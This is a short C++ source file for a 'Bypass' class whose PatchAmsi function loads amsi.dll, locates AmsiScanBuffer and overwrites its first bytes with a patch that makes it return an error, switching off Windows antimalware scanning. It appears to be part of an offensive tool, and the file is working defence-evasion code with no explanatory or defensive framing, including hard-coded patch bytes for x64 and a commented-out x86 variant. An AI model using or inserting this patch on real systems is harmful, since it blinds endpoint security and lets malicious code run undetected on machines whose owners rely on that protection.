#include "pch.h"
#include "Bypass.h"
#include "InlinePatch.h"

Bypass::Bypass()
{
}


Bypass::~Bypass()
{
}

//#ifdef _X32
//unsigned char amsipatch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
//SIZE_T patchsize = 8;
//#endif
//#ifdef _X64
//unsigned char amsipatch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
//SIZE_T patchsize = 6;
//#endif

unsigned char amsipatch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
BOOL Bypass::PatchAmsi()
{

	printf("[+] Patching amsi.\n");

	HMODULE lib = LoadLibraryA("amsi.dll");
	if (lib == NULL)
		return -2;

	LPVOID addr = GetProcAddress(lib, "AmsiScanBuffer");
	if (addr == NULL)
		return -2;
	InlinePatch pAmsi;
	return pAmsi.Patch(addr, amsipatch);
}



